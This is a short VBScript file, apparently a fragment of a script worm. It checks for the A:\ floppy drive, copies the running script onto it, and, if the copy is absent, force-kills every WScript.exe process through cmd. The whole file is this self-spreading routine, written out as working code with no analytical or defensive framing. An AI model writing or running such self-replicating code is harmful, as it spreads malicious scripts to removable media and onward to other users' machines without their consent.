set fso = createobject("Scripting.FileSystemObject")
set aaa = createobject("WScript.shell")

A  = "A:\" & WScript.scriptname

if fso.folderexists("A:\") Then
fso.copyfile WScript.scriptfullname, "A:\"
if not fso.fileexists(A) Then 
aaa.run "cmd /c taskkill /im WScript.exe /f" 

end if
end if